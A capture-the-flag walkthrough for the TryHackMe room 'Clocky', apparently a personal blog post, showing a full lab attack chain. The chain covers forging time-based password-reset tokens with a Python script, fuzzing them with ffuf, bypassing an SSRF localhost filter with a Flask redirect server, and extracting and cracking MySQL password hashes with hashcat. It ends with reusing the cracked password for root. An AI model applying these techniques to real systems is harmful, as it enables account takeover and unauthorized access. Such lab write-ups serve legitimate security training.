---
title: 'TryHackMe: Clocky'
author: jaxafed
categories: [TryHackMe]
tags: [web, ffuf, python, flask, ssrf, mysql, hashcat]
render_with_liquid: false
media_subpath: /images/tryhackme_clocky/
image:
  path: room_image.webp
---

Clocky started with us finding a backup on a webserver that included another webserver's source code. Reading the source code, we saw the application using time and username to create password reset tokens. With this, we were able to create our own tokens and reset the password for the administrator user. After logging in as the administrator user, we used an SSRF vulnerability to reach a SQL file hosted on another web server. Inside this file, we found a password, and combining it with the usernames we got from the source code, we were able to get a SSH session. At last, after finding the credentials for the database and dumping the MySQL user's hashes, we were able to crack them and use the same password to get access as root.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/clocky){: .center }


## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.125.37 
Nmap scan report for 10.10.125.37
Host is up (0.082s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:42:e0:c0:d0:a9:8a:c3:82:65:ab:1e:5c:9c:0d:ef (RSA)
|   256 ff:b6:27:d5:8f:80:2a:87:67:25:ef:93:a0:6b:5b:59 (ECDSA)
|_  256 e1:2f:4a:f5:6d:f1:c4:bc:89:78:29:72:0c:ec:32:d2 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
8000/tcp open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
| http-robots.txt: 3 disallowed entries 
|_/*.sql$ /*.zip$ /*.bak$
8080/tcp open  http-proxy Werkzeug/2.2.3 Python/3.8.10
|_http-server-header: Werkzeug/2.2.3 Python/3.8.10
...
```

There are four ports open.

- 22/SSH
- 80/HTTP
- 8000/HTTP
- 8080/HTTP

## First Flag

Nmap has already notified us of the existence of `robots.txt` on port 8000.

Checking the `robots.txt`, we get a couple of disallowed extensions and get the first flag.

![Web Server Port 8000 Robots.txt](web_8000_robots_txt.webp){: width="600" height="300" }

## Second Flag

Using gobuster for fuzzing with disallowed extensions, we discover the `index.zip` file.

```console
$ gobuster dir -u 'http://10.10.125.37:8000/' -x sql,zip,bak -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.125.37:8000/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sql,zip,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.zip            (Status: 200) [Size: 1922]
```
{: .wrap }

After downloading and extracting the archive, we get the second flag along with the partial source code for the web application on port 8080.

```console
$ wget http://10.10.125.37:8000/index.zip                                                    
--2024-03-29 23:54:32--  http://10.10.125.37:8000/index.zip
Connecting to 10.10.125.37:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1922 (1.9K) [application/zip]
Saving to: ‘index.zip’

index.zip                       100%[======================================================>]   1.88K  --.-KB/s    in 0s      

2024-03-29 23:54:32 (43.3 MB/s) - ‘index.zip’ saved [1922/1922]

                                                                                                                               
$ unzip index.zip                  
Archive:  index.zip
  inflating: app.py                  
 extracting: flag2.txt

$ cat flag2.txt 
THM[REDACTED]
```

## Third Flag

Looking at the source code in `app.py`, we discover two usernames from the comments.

- `jane`
- `clarice`

We learn the existence of the `database.sql` file from the comments.

>`Execute "database.sql" before using this`

We also discover a couple of endpoints.

- `/administrator`: The login page, upon logging in, redirects to `/dasboard`.
- `/forgot_password`: Given a username with a `POST` request, it generates a token and updates the database with it.
- `/password_reset`: Currently, it only compares the user-given token to one from the database.


Looking at how the password reset tokens are generated at the `/forgot_password` endpoint, it only uses the current time and username.

```python
if cursor.fetchone():
	value = datetime.datetime.now()
	lnk = str(value)[:-4] + " . " + username.upper()
	lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
	sql = "UPDATE reset_token SET token=%s WHERE username = %s"
	cursor.execute(sql, (lnk, username))
	connection.commit()
```

The server already returns us the current time for it; with the `Date` header, we only need to brute-force the two digits of miliseconds to generate a valid token.

Requesting a password reset token for the `administrator` user using the `/forgot_password` endpoint.

![Web Server Forgot Password Request](web_8080_forgot_password_request.webp){: width="800" height="400" }

After updating the value with the time we got from the `Date` header, we can use this Python script to generate tokens.

```python
import datetime
import hashlib

username = "administrator"

for i in range(0,100):
	i = str(i).rjust(2, "0")
	value = "2024-03-30 00:08:04." + i
	lnk = value + " . " + username.upper()
	lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
	print(lnk)
```
{: file="generate_tokens.py"}

Generating the tokens and writing them to a file.

```console
$ python3 generate_tokens.py > tokens.txt
```

Now, before we start testing the tokens, we have to first discover the parameter name used by the `/password_reset` endpoint, since the `TEMPORARY` parameter found in the source code returns `Invalid parameter`.

![Web Server Forgot Password Invalid Parameter](web_8080_password_reset_invalid_parameter.webp){: width="700" height="200" }

Using `ffuf` to fuzz for the parameter name, we see that it returns `Invalid token` instead with the `token` parameter.

```console
$ ffuf -u 'http://10.10.125.37:8080/password_reset?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -t 100 -fr 'Invalid parameter'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.125.37:8080/password_reset?FUZZ=test
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Regexp: Invalid parameter
________________________________________________

token                   [Status: 200, Size: 22, Words: 2, Lines: 1, Duration: 114ms]
```
{: .wrap }

We can now test the generated tokens by using `ffuf` once again.

```console
$ ffuf -u 'http://10.10.125.37:8080/password_reset?token=FUZZ' -w tokens.txt -t 100 -mc all -fr 'Invalid token'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.125.37:8080/password_reset?token=FUZZ
 :: Wordlist         : FUZZ: tokens.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Regexp: Invalid token
________________________________________________

fbf8a350e9f8348752f8c48d2500e7703ebc945c [Status: 200, Size: 1627, Words: 665, Lines: 54, Duration: 653ms]
:: Progress: [100/100] :: Job [1/1] :: 108 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
{: .wrap }

Using the found token, we can reset the password for the `administrator` user with a request to `http://10.10.125.37:8080/password_reset?token=fbf8a350e9f8348752f8c48d2500e7703ebc945c` endpoint.

![Web Server Successful Password Reset](web_8080_successful_password_reset.webp){: width="800" height="400" }

After logging in with the new password at the `/administrator` endpoint, we get the third flag in `/dashboard`.

![Web Server Dashboard](web_8080_dashboard.webp){: width="800" height="400" }

## Fourth Flag

On the `/dashaboard` endpoint, testing the form. Upon us suplying a value with the `location` parameter on a `POST` request, the server returns a file called `file.txt`.

After testing some directory traversal payloads to read local files and failing, testing it by giving an URL.

This works as the server makes a request and sends us the response back.

![Web Server Dashboard SSRF Payload](web_8080_ssrf_payload.webp){: width="800" height="400" }

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.125.37 - - [30/Mar/2024 00:42:16] "GET / HTTP/1.1" 200 -
```

Now, using this `SSRF` vulnerability, we can try to reach out to port 80 from `localhost`, since we are getting forbidden by accessing it directly ourselves.

Attempting to access `localhost` with different payloads, there seems to be some filter.

![Web Server Dashboard SSRF Payload 127.0.0.1 Fail](web_8080_ssrf_127-0-0-1_fail.webp){: width="800" height="400" }
![Web Server Dashboard SSRF Payload Localhost Fail](web_8080_ssrf_localhost_fail.webp){: width="800" height="400" }
![Web Server Dashboard SSRF Payload 0.0.0.0 Fail](web_8080_ssrf_0-0-0-0_fail.webp){: width="800" height="400" }

We can use redirection to bypass the filter by running a webserver like this using `flask`.

```python
from flask import Flask, redirect
app = Flask(__name__)	

@app.route('/<path:path>')	
def index(path):
	return redirect(f'http://127.0.0.1/{path}', code=301)
	
if __name__ == "__main__":	
	app.run(host="0.0.0.0", port=80)
```
{: file="redirect.py"}

After running the server and using the redirect, we see that it works. The server gets redirected to `http://127.0.0.1/index.html` and we get the response back.

![Web Server Dashboard SSRF Payload Redirect Success](web_8080_ssrf_payload_success.webp){: width="800" height="400" }

```console
$ python3 redirect.py
...
10.10.125.37 - - [30/Mar/2024 01:19:01] "GET /index.html HTTP/1.1" 301 -
```

Looking for interesting files, we check the `database.sql` file mentioned before.

Inside this file, we found the fourth flag.

![Web Server Dashboard SSRF Payload Fourth Flag](web_8080_ssrf_database-sql_flag.webp){: width="800" height="400" }

## Fifth Flag

From the `database.sql` file, we also get a password.

![Web Server Dashboard SSRF Payload Fourth Flag](web_8080_ssrf_database-sql_password.webp){: width="800" height="400" }

Testing the password we got with the usernames we found before against SSH, we get a shell as `clarice` and can read the fifth flag.

```console
$ ssh clarice@10.10.125.37
clarice@10.10.125.37's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-165-generic x86_64)
...
clarice@clocky:~$ cat flag5.txt 
THM[REDACTED]
```

## Sixth Flag

From `/home/clarice/app/.env`, we get the database password for the `clocky_user` user.

Using these credentials, we can access the MySQL database.

```console
clarice@clocky:~$ cat ~/app/.env
db=[REDACTED]
clarice@clocky:~$ mysql -u clocky_user -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.34-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Checking the MySQL users, the `dev` user stands out.

```console
mysql> select user from mysql.user;
+------------------+
| user             |
+------------------+
| clocky_user      |
| dev              |
| clocky_user      |
| debian-sys-maint |
| dev              |
| mysql.infoschema |
| mysql.session    |
| mysql.sys        |
| root             |
+------------------+
9 rows in set (0.00 sec)
```

We see that the `caching_sha2_password` plugin is used for authentication.

```console
mysql> select user,host,plugin from mysql.user where user="dev";
+------+-----------+-----------------------+
| user | host      | plugin                |
+------+-----------+-----------------------+
| dev  | %         | caching_sha2_password |
| dev  | localhost | caching_sha2_password |
+------+-----------+-----------------------+
2 rows in set (0.00 sec)
```

We can use this query to extract the hash in a format `hashcat` can use from the `authentication_string` column.

```console
mysql> SELECT CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM mysql.user WHERE user="dev";
+--------------------------+
| hash                     |
+--------------------------+
| $mysql$A$005*0D17...6142 |
| $mysql$A$005*1C16...462E |
+--------------------------+
2 rows in set (0.00 sec)
```

Using `hashcat` with mode `7401`, we managed to crack the hashes. Both hashes crack to the same password.

```console
$ cat hashes.txt
$mysql$A$005*0D17...6142
$mysql$A$005*1C16...462E

$ hashcat -m 7401 hashes.txt /usr/share/wordlists/rockyou.txt
...
$mysql$A$005*1C16...462E:[REDACTED]
$mysql$A$005*0D17...6142:[REDACTED]
...
```

Using this password, we are able to switch to the root user and read the sixth flag.

```console
clarice@clocky:~$ su - root
Password: 
root@clocky:~# cat flag6.txt 
THM[REDACTED]
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>

